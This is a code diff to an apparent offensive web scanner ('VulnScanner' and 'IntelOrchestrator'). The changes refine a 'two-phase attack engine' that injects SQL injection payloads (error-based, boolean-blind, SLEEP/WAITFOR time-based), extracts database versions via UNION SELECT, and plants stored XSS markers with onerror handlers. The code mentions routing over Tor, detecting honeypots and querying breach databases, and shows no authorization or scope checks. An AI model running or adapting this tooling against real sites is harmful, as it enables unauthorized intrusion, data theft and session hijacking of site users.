@@ -1184,8 +1184,9 @@ class VulnScanner:
                 full_url = urljoin(page_url, href)
                 parsed = urlparse(full_url)
 
-                # Only follow same-domain links
-                if parsed.netloc and parsed.netloc != domain:
+                if not parsed.scheme or not parsed.netloc:
+                    continue
+                if parsed.netloc != domain:
                     continue
 
                 clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
@@ -1217,6 +1218,8 @@ class VulnScanner:
                 form_url = urljoin(page_url, action) if action else page_url
 
                 parsed = urlparse(form_url)
+                if not parsed.scheme or not parsed.netloc:
+                    parsed = urlparse(urljoin(page_url, form_url))
                 if parsed.netloc and parsed.netloc != domain:
                     continue
 
@@ -1426,13 +1429,13 @@ class VulnScanner:
         High score = more payloads, mutations, and time-based checks.
         Low score = quick probe and move on."""
         score = 0
-        if profile["reflected"]:
+        if profile.get("reflected"):
             score += 3
-        if profile["error_sensitive"]:
+        if profile.get("error_sensitive"):
             score += 4
-        if profile["reflection_context"] in ("attribute", "script"):
+        if profile.get("reflection_context") in ("attribute", "script"):
             score += 2
-        if profile["type"] == "int":
+        if profile.get("type") == "int":
             score += 1
         # High-value param names
         name = profile.get("name", "").lower()
@@ -1467,8 +1470,7 @@ class VulnScanner:
         baseline_text = baseline_resp.text[:8000]
 
         # ── Stage 1: Quick probe (always runs) ─────────────────────────
-        # Single quote / boundary probe — detect if input reaches SQL at all
-        quote = "" if profile["type"] == "int" else "'"
+        quote = "" if profile.get("type") == "int" else "'"
         probe = self._send_test(endpoint, pname, f"{pval}{quote}")
         if not probe or not probe.text:
             return findings
@@ -1491,7 +1493,7 @@ class VulnScanner:
 
         # ── Stage 2: Error-based (if error detected or medium+ depth) ──
         if sql_error_found or depth >= 4:
-            if profile["type"] == "int":
+            if profile.get("type") == "int":
                 payloads = [
                     f"{pval} OR 1=1-- -", f"{pval} AND 1=2-- -",
                     f"{pval} UNION SELECT NULL-- -",
@@ -1554,7 +1556,7 @@ class VulnScanner:
 
         # ── Stage 3: Blind boolean (if response changed or medium+ depth) ──
         if (response_changed or depth >= 4) and not findings:
-            if profile["type"] == "int":
+            if profile.get("type") == "int":
                 true_val, false_val = f"{pval} AND 1=1", f"{pval} AND 1=2"
             else:
                 true_val = f"{pval}' AND '1'='1"
@@ -1567,7 +1569,7 @@ class VulnScanner:
                 false_diff = self._response_diff(baseline_text, false_resp.text)
 
                 if true_diff["similar"] and not false_diff["similar"]:
-                    test_url = f"{url}?{pname}={quote(true_val)}" if endpoint["method"] == "GET" else url
+                    test_url = f"{url}?{pname}={quote(true_val)}" if endpoint.get("method") == "GET" else url
                     findings.append({
                         "severity": SEV_CRITICAL,
                         "title": f"Blind SQLi via '{pname}' at {path}",
@@ -1595,7 +1597,7 @@ class VulnScanner:
             bv = max(abs(t - bt) for t in times)
             threshold = bt + max(2.0, bv * 3)
 
-            if profile["type"] == "int":
+            if profile.get("type") == "int":
                 tp = [(f"{pval} AND SLEEP(3)-- -", "SLEEP"),
                       (f"{pval} AND (SELECT SLEEP(3))-- -", "subquery SLEEP"),
                       (f"{pval}; WAITFOR DELAY '0:0:3'-- -", "WAITFOR")]
@@ -1635,7 +1637,7 @@ class VulnScanner:
     def _sqli_extract(self, endpoint: dict, pname: str, pval: str,
                       profile: dict) -> str:
         """Try to extract DB version via UNION SELECT after confirming SQLi."""
-        q = "" if profile["type"] == "int" else "'"
+        q = "" if profile.get("type") == "int" else "'"
         for cols in range(1, 8):
             nulls = ",".join(["NULL"] * cols)
             for pos in range(cols):
@@ -2180,8 +2182,14 @@ class VulnScanner:
 
             # Crawl to discover real endpoints with parameters
             if html:
-                self._run_check("crawling for endpoints", self.crawl_for_endpoints,
-                                (base_url, html), 0.0, [])
+                print(f"      crawling for endpoints...", end="", flush=True)
+                try:
+                    discovered = self.crawl_for_endpoints(base_url, html)
+                    print(f" {len(discovered)} endpoint(s)")
+                except Exception as e:
+                    discovered = []
+                    print(f" error: {type(e).__name__}")
+                    integrity_log("intel", f"crawl_error:{type(e).__name__}")
 
             # ── TWO-PHASE ATTACK ENGINE ──────────────────────────────────
             # Phase A: Inject tracked payloads into every endpoint
@@ -2201,8 +2209,8 @@ class VulnScanner:
             self._session.reset_domain_blocks(domain)
 
             # ── PHASE A: Inject + immediate analysis ──────────────────
-            # Track every injected payload with a unique marker
-            injected_markers: Dict[str, dict] = {}  # marker -> {type, endpoint, param, payload}
+            injected_markers: Dict[str, dict] = {}
+            revisit_from_injection: Set[str] = set()  # links discovered during injection
 
             print(f"      Phase A: testing {len(endpoints)} endpoint(s)...")
             tested = 0
@@ -2233,18 +2241,31 @@ class VulnScanner:
                 except Exception as e:
                     integrity_log("intel", f"xss_error:{path}:{type(e).__name__}")
 
-                # Inject stored XSS markers (even if reflected XSS wasn't found)
+                # Inject stored XSS markers with unique IDs for cross-endpoint tracking
                 for pi in [p for p in ep["params"] if not p.get("hidden")][:2]:
                     marker_id = f"GSXSS{secrets.token_hex(4)}"
-                    stored_payload = f"<img src=x onerror='{marker_id}'>"
+                    stored_payload = f'<img src=x onerror="{marker_id}">'
                     try:
-                        self._send_test(ep, pi["name"], stored_payload)
+                        inject_resp = self._send_test(ep, pi["name"], stored_payload)
                         injected_markers[marker_id] = {
                             "type": "stored_xss",
                             "endpoint": path,
                             "param": pi["name"],
                             "payload": stored_payload,
+                            "seen_in": [],
                         }
+                        # Extract links from the injection response for smart revisiting
+                        if inject_resp and inject_resp.text and HAS_BS4:
+                            try:
+                                _soup = BeautifulSoup(inject_resp.text[:50000], "html.parser")
+                                for _a in _soup.find_all("a", href=True):
+                                    _href = _a.get("href", "")
+                                    if _href and not _href.startswith(("#", "javascript:", "mailto:")):
+                                        _full = urljoin(ep["url"], _href)
+                                        if domain in urlparse(_full).netloc:
+                                            revisit_from_injection.add(_full)
+                            except Exception:
+                                pass
                     except Exception:
                         pass
 
@@ -2293,68 +2314,138 @@ class VulnScanner:
                 else:
                     print(f" -> clean")
 
-            # ── PHASE B: Re-crawl and search for stored/delayed payloads ──
+            # ── PHASE B: Multi-round revisit with context-aware detection ──
             if injected_markers:
-                print(f"\n      Phase B: searching for {len(injected_markers)} stored payloads...")
+                print(f"\n      Phase B: tracking {len(injected_markers)} markers "
+                      f"across {len(revisit_from_injection)} linked pages...")
                 self._session.reset_domain_blocks(domain)
 
-                # Re-visit discovered pages + common pages where stored content appears
-                revisit_urls = set()
+                # Build prioritized revisit list:
+                # 1. Links found IN injection responses (highest priority — the app told us to go here)
+                # 2. All crawled endpoint URLs
+                # 3. Common render pages as fallback
+                revisit_urls: List[str] = []
+                seen_revisit: Set[str] = set()
+
+                for u in revisit_from_injection:
+                    if u not in seen_revisit:
+                        seen_revisit.add(u)
+                        revisit_urls.append(u)
+
                 for ep in endpoints[:20]:
-                    revisit_urls.add(ep["url"])
-                # Add common pages where stored payloads might render
+                    if ep["url"] not in seen_revisit:
+                        seen_revisit.add(ep["url"])
+                        revisit_urls.append(ep["url"])
+
                 for suffix in ["/", "/index.php", "/dashboard", "/admin",
                                "/comments", "/users", "/search", "/profile",
                                "/blog", "/posts", "/list", "/home"]:
-                    revisit_urls.add(urljoin(base_url, suffix))
+                    u = urljoin(base_url, suffix)
+                    if u not in seen_revisit:
+                        seen_revisit.add(u)
+                        revisit_urls.append(u)
 
                 stored_found = 0
-                for revisit_url in list(revisit_urls)[:25]:
-                    if shutdown_requested() or self._session.is_domain_blocked(domain):
-                        break
-                    try:
-                        resp = self._session.get(revisit_url, allow_wayback=False)
-                        if not resp or not resp.text:
-                            continue
+                already_reported: Set[str] = set()
 
-                        # Search this response for ANY injected marker
-                        for marker_id, marker_info in injected_markers.items():
-                            if marker_id in resp.text:
-                                stored_found += 1
+                # Multiple revisit rounds — some payloads only appear after
+                # page refresh, cache clear, or DB commit cycles
+                for revisit_round in range(2):
+                    if shutdown_requested():
+                        break
+                    if revisit_round > 0:
+                        print(f"      Phase B round {revisit_round + 1}...")
+                        time.sleep(2 + secrets.randbelow(3000) / 1000.0)
+
+                    for revisit_url in revisit_urls[:30]:
+                        if shutdown_requested() or self._session.is_domain_blocked(domain):
+                            break
+                        try:
+                            resp = self._session.get(revisit_url, allow_wayback=False)
+                            if not resp or not resp.text:
+                                continue
+
+                            for marker_id, minfo in injected_markers.items():
+                                if marker_id not in resp.text:
+                                    continue
+
                                 revisit_path = urlparse(revisit_url).path or "/"
-                                inject_path = marker_info["endpoint"]
+                                inject_path = minfo["endpoint"]
+                                report_key = f"{marker_id}:{revisit_path}"
+
+                                # Track where this marker appeared
+                                if revisit_path not in minfo["seen_in"]:
+                                    minfo["seen_in"].append(revisit_path)
+
+                                if report_key in already_reported:
+                                    continue
+                                already_reported.add(report_key)
+
+                                # Context-aware analysis: determine confidence
+                                idx = resp.text.find(marker_id)
+                                context_window = resp.text[max(0, idx - 200):idx + len(marker_id) + 200]
+                                ctx_lower = context_window.lower()
+
+                                # Determine rendering context
+                                if f"onerror=\"{marker_id}\"" in context_window or \
+                                   f"onerror='{marker_id}'" in context_window:
+                                    xss_context = "event_handler"
+                                    confidence = 0.95
+                                elif f"<script" in ctx_lower and marker_id in context_window:
+                                    xss_context = "script_block"
+                                    confidence = 0.9
+                                elif f"&lt;" in ctx_lower or f"&quot;" in ctx_lower:
+                                    xss_context = "html_escaped"
+                                    confidence = 0.4
+                                elif f"<" in context_window[:idx - max(0, idx - 200)]:
+                                    xss_context = "html_unescaped"
+                                    confidence = 0.85
+                                else:
+                                    xss_context = "text"
+                                    confidence = 0.7
+
+                                if confidence < 0.5:
+                                    continue  # Skip escaped/low-confidence
+
+                                stored_found += 1
+                                sev = SEV_CRITICAL if confidence >= 0.85 else SEV_HIGH
+
+                                spread = minfo["seen_in"]
+                                spread_str = " -> ".join(spread) if len(spread) > 1 else revisit_path
 
                                 findings.append({
-                                    "severity": SEV_CRITICAL,
-                                    "title": f"Stored XSS: injected at {inject_path}, "
-                                             f"rendered at {revisit_path}",
-                                    "detail": f"Payload injected via '{marker_info['param']}' at "
-                                              f"{inject_path} appears in response from {revisit_path}. "
-                                              "This is a stored/persistent XSS vulnerability.",
-                                    "evidence": f"marker: {marker_id}, inject: {inject_path} "
-                                                f"param: {marker_info['param']}, "
-                                                f"rendered: {revisit_path}",
+                                    "severity": sev,
+                                    "title": f"Stored XSS: {inject_path} -> {revisit_path}",
+                                    "detail": f"Payload injected via '{minfo['param']}' at "
+                                              f"{inject_path} renders at {revisit_path} "
+                                              f"in {xss_context} context. "
+                                              f"Spread: {spread_str}",
+                                    "evidence": f"marker: {marker_id}, context: {xss_context}, "
+                                                f"confidence: {confidence}, "
+                                                f"inject: {inject_path}, render: {revisit_path}",
                                     "exploitable": True,
                                     "test_url": revisit_url,
                                     "exploit_info": {
                                         "type": "stored_xss",
-                                        "parameter": marker_info["param"],
+                                        "parameter": minfo["param"],
                                         "path": inject_path,
                                         "render_path": revisit_path,
-                                        "method": f"Stored XSS: POST payload to "
-                                                  f"{inject_path} via '{marker_info['param']}', "
-                                                  f"executes on {revisit_path}.",
-                                        "risk": "Persistent XSS, session hijacking of other users",
+                                        "spread": spread,
+                                        "xss_context": xss_context,
+                                        "method": f"Stored XSS: inject via '{minfo['param']}' at "
+                                                  f"{inject_path}, renders in {xss_context} at "
+                                                  f"{revisit_path}.",
+                                        "risk": "Persistent XSS, session hijacking",
                                     },
-                                    "confidence": 0.95,
+                                    "confidence": confidence,
                                 })
-                    except Exception:
-                        pass
+                        except Exception:
+                            pass
 
                 if stored_found:
-                    print(f"      Phase B: {stored_found} stored vuln(s) found!")
+                    print(f"      Phase B: {stored_found} stored vuln(s) confirmed!")
                 else:
-                    print(f"      Phase B: no stored payloads detected")
+                    print(f"      Phase B: no stored payloads detected in {len(revisit_urls)} pages")
 
             # Also run SSRF/cmd injection against base URL
             self._run_check("SSRF", self._check_ssrf_indicators,
@@ -4164,12 +4255,15 @@ class IntelOrchestrator:
             return r
 
         result = self._run_phase(1, "Fetching main page", _phase1)
-        if result and not result.get("honeypot"):
+        if not result:
+            print(f"  [!] Could not fetch {domain} (both HTTPS and HTTP failed).")
+            print(f"  [!] The site may be down, blocking Tor, or require authentication.")
+            print(f"  [*] Continuing with header/DNS checks only...")
+        elif result.get("honeypot"):
+            print(f"  [!] Honeypot/WAF detected. Some checks may be limited.")
+        else:
             self._results.append(result)
             self._print_extraction(result)
-        elif result and result.get("honeypot"):
-            print(f"  [!] Honeypot/WAF detected. Some checks may be limited.")
-        if result and not result.get("honeypot"):
             if result.get("url", "").startswith("http://"):
                 base_url = f"http://{domain}"
 
@@ -4307,7 +4401,10 @@ class IntelOrchestrator:
                 print(f"  [!] Dehashed: BREACHED ({dehashed.get('entry_count', '?')} entries)")
             self._results.append({"type": "breach_check", "data": dehashed})
         if not hibp and not dehashed:
-            print(f"  [*] No breach DB API keys configured (set HIBP_KEY / DEHASHED_KEY)")
+            if not HIBP_API_KEY and not DEHASHED_API_KEY:
+                print(f"  [*] No breach DB API keys configured (set HIBP_KEY / DEHASHED_KEY)")
+            else:
+                print(f"  [*] Breach check returned no results (API may be rate-limited or unavailable)")
 
     def run_query(self, query: str, max_pages: int = 20):
         """Search + scrape pipeline."""
